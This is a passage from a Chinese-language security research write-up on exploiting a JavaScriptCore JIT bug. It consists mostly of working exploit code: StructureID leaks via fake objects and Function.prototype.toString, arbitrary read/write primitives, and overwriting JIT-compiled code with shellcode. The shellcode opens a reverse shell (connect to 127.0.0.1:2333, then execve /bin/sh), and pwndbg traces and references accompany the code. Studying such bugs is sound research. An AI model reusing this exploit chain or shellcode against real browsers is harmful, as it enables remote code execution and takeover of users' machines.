因此，我们可以尝试构造一个假的StructureID，使得它匹配StructureID时发现不是数组类型，就可以调用到`getByVal`
    var arr_leak = new Array(noCow,2.2,3.3);
    function leak_structureID(obj) {
       let jscell_double = p64f(0x00000000,0x01062307);
       let container = {
          jscell:jscell_double,
          butterfly:obj
       }
       let container_addr = addressOf(container);
       let hax = fakeObject(container_addr[0]+0x10,container_addr[1]);
       f64[0] = hax[0];
       let structureID = u32[0];
       //修复JSCell
       u32[1] = 0x01082307 - 0x20000;
       container.jscell = f64[0];;
       return structureID;
    }
    var structureID = leak_structureID(arr_leak);
    debug(structureID);
    print();
调试如下  
baseValue.isObject()判断通过，将进入分支
     ► 962         } else if (baseValue.isObject()) {
       963             JSObject* object = asObject(baseValue);
       964             if (object->canGetIndexQuickly(i))
       965                 return object->getIndexQuickly(i);
       966 
       967             bool skipMarkingOutOfBounds = false;
    pwndbg> p baseValue.isObject()
    $3 = true
接下来，我们跟踪进入`canGetIndexQuickly`函数
    In file: /home/sea/Desktop/WebKit/Source/JavaScriptCore/runtime/JSObject.h
       272             return false;
       273         case ALL_INT32_INDEXING_TYPES:
       274         case ALL_CONTIGUOUS_INDEXING_TYPES:
       275             return i vectorLength() && butterfly->contiguous().at(this, i);
       276         case ALL_DOUBLE_INDEXING_TYPES: {
     ► 277             if (i >= butterfly->vectorLength())
       278                 return false;
       279             double value = butterfly->contiguousDouble().at(this, i);
       280             if (value != value)
       281                 return false;
       282             return true;
    pwndbg> p butterfly->vectorLength()
    $11 = 32767
这里获取了容量，如果i在长度范围之内，则返回true，即可成功取得数据。由于这里我们是将`arr_leak`这个对象当成了`butterfly`，因此容量也就是&arr_leak-0x4处的数据，即
    pwndbg> x /2wx 0x7fffef1613e8-0x8
    0x7fffef1613e0:    0xef1561a0    0x00007fff
与32767对应上了。由此我们看出，这种方法的条件是`&arr_leak-0x4处的数据要大于0即可`，因此可以在内存布局的时候在`arr_leak`前面布置一个数组并用数据填充。如果不在前面布局一个数组用于填充，则利用程序将受到随机化的影响而不稳定。
####  Function.prototype.toString.call
另一个方法是通过toString()
函数的调用链来实现任意地址读数据，主要就是伪造调用链中的结构，最终使得`identifier`指向需要泄露的地址处，然后使用`Function.prototype.toString.call`获得任意地址处的数据，可参考[文章](https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf)
    function leak_structureID2(obj) {
        // https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf
        var unlinkedFunctionExecutable = {
            m_isBuitinFunction: i2f(0xdeadbeef),
            pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6,
            m_identifier: {},
        };
        var fakeFunctionExecutable = {
          pad0: 0, pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6, pad7: 7, pad8: 8,
          m_executable: unlinkedFunctionExecutable,
        };
        var container = {
          jscell: i2f(0x00001a0000000000),
          butterfly: {},
          pad: 0,
          m_functionExecutable: fakeFunctionExecutable,
        };
        let fakeObjAddr = addressOf(container);
        let fakeObj = fakeObject(fakeObjAddr[0] + 0x10,fakeObjAddr[1]);
        unlinkedFunctionExecutable.m_identifier = fakeObj;
        container.butterfly = obj;
        var nameStr = Function.prototype.toString.call(fakeObj);
        let structureID = nameStr.charCodeAt(9);
        // repair the fakeObj's jscell
        u32[0] = structureID;
        u32[1] = 0x01082309-0x20000;
        container.jscell = f64[0];
        return structureID;
    }
###  任意地址读写原语
在泄露了StructureID以后，就可以伪造数组对象进行任意地址读写了
    var structureID = leak_structureID2(arr_leak);
    u32[0] = structureID;
    u32[1] = 0x01082309-0x20000;
    //debug(describe(arr_leak));
    debug('[+] structureID=' + structureID);
    var victim = [1.1,2.2,3.3];
    victim['prop'] = 23.33;
    var container = {
       jscell:f64[0],
       butterfly:victim
    }
    var container_addr = addressOf(container);
    var hax = fakeObject(container_addr[0]+0x10,container_addr[1]);
    var padding = [1.1,2.2,3.3,4.4];
    var unboxed = [noCow,2.2,3.3];
    var boxed = [{}];
    /*debug(describe(unboxed));
    debug(describe(boxed));
    debug(describe(victim));
    debug(describe(hax));
    */
    hax[1] = unboxed;
    var sharedButterfly = victim[1];
    hax[1] = boxed;
    victim[1] = sharedButterfly;
    function NewAddressOf(obj) {
       boxed[0] = obj;
       return u64f(unboxed[0]);
    }
    function NewFakeObject(addr_l,addr_h) {
       var addr = p64f(addr_l,addr_h);
       unboxed[0] = addr;
       return boxed[0];
    }
    function read64(addr_l,addr_h) {
       //必须保证在vicim[-1]处有数据，即used slots和max slots字段，否则将导致读取失败
       //因此我们换用另一种方法，即利用property去访问
       hax[1] = NewFakeObject(addr_l + 0x10,addr_h);
       return NewAddressOf(victim.prop);
    }
    function write64(addr_l,addr_h,double_val) {
       hax[1] = NewFakeObject(addr_l + 0x10,addr_h);
       victim.prop = double_val;
    }
###  劫持JIT编译的代码
    var shellcodeFunc = getJITFunction();
    shellcodeFunc();
    var shellcodeFunc_addr = NewAddressOf(shellcodeFunc);
    var executable_base_addr = read64(shellcodeFunc_addr[0] + 0x18,shellcodeFunc_addr[1]);
    var jit_code_addr = read64(executable_base_addr[0] + 0x8,executable_base_addr[1]);
    var rwx_addr = read64(jit_code_addr[0] + 0x20,jit_code_addr[1]);
    debug("[+] shellcodeFunc_addr=" + shellcodeFunc_addr[1].toString(16) + shellcodeFunc_addr[0].toString(16));
    debug("[+] executable_base_addr=" + executable_base_addr[1].toString(16) + executable_base_addr[0].toString(16));
    debug("[+] jit_code_addr=" + jit_code_addr[1].toString(16) + jit_code_addr[0].toString(16));
    debug("[+] rwx_addr=" + rwx_addr[1].toString(16) + rwx_addr[0].toString(16));
    const shellcode = [
        0x31, 0xD2, 0x31, 0xF6, 0x40, 0xB6, 0x01, 0x31, 0xFF, 0x40, 0xB7, 0x02, 0x31, 0xC0, 0xB0, 0x29,
        0x0F, 0x05, 0x89, 0x44, 0x24, 0xF8, 0x89, 0xC7, 0x48, 0xB8, 0x02, 0x00, 0x09, 0x1D, 0x7F, 0x00,
        0x00, 0x01, 0x48, 0x89, 0x04, 0x24, 0x48, 0x89, 0xE6, 0xB2, 0x10, 0x48, 0x31, 0xC0, 0xB0, 0x2A,
        0x0F, 0x05, 0x8B, 0x7C, 0x24, 0xF8, 0x31, 0xF6, 0xB0, 0x21, 0x0F, 0x05, 0x40, 0xB6, 0x01, 0x8B,
        0x7C, 0x24, 0xF8, 0xB0, 0x21, 0x0F, 0x05, 0x40, 0xB6, 0x02, 0x8B, 0x7C, 0x24, 0xF8, 0xB0, 0x21,
        0x0F, 0x05, 0x48, 0xB8, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x48, 0x89, 0x44, 0x24,
        0xF0, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2, 0x48, 0x8D, 0x7C, 0x24, 0xF0, 0x48, 0x31, 0xC0, 0xB0,
        0x3B, 0x0F, 0x05
    ];
    function ByteToDwordArray(payload)
    {
        let sc = []
        let tmp = 0;
        let len = Math.ceil(payload.length/6)
        for (let i = 0; i < len; i += 1) {
            tmp = 0;
            pow = 1;
            for(let j=0; j<6; j++){
                let c = payload[i*6+j]
                if(c === undefined) {
                    c = 0;
                }
                pow = j==0 ? 1 : 256 * pow;
                tmp += c * pow;
            }
            tmp += 0xc000000000000;
            sc.push(tmp);
        }
        return sc;
    }
    //debug(describe(shellcodeFunc));
    //debug(shellcode.length);
    //替换jit的shellcode
    let sc = ByteToDwordArray(shellcode);
    for(let i=0; i<sc.length; i++) {
       write64(rwx_addr[0] + i*6,rwx_addr[1],i2f(sc[i]));
    }
    debug("trigger shellcode")
    //执行shellcode
    print();
    shellcodeFunc();
    print();
这里，我们使用`ByteToDwordArray`将shellcode转为6字节有效数据每个的数组，这样是为了在write64时能一次写入6个有效数据，减少`for(let
i=0; i<sc.length;
i++)`的次数，避免`write64`被JIT编译，否则会报错崩溃，原因是因为我们伪造的对象未通过编译时的某些检查，但这不影响我们漏洞利用。  
结果展示
## 0x03 感想
通过本次研究学习，理解了JSC的边界检查消除机制，同时也对JSC中的CSE有了一些了解，其与V8之间也非常的相似。
## 0x04 参考
[FireShell2020——从一道ctf题入门jsc利用](https://www.anquanke.com/post/id/223494#h3-7)  
[WebKit
Commitdiff](https://git.webkit.org/?p=WebKit.git;a=commitdiff;h=951d27d5ba08b6c29370b05dc6b4ffe18be1ca18;hp=385e9bf9c686204d148574362b5c3da3b5319314)  
[eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods](https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf)  
[JITSploitation I：JIT编译器漏洞分析 ](https://www.sohu.com/a/468929360_120622013)  
[Project Zero: JITSploitation I: A JIT
Bug](https://googleprojectzero.blogspot.com/2020/09/jitsploitation-one.html)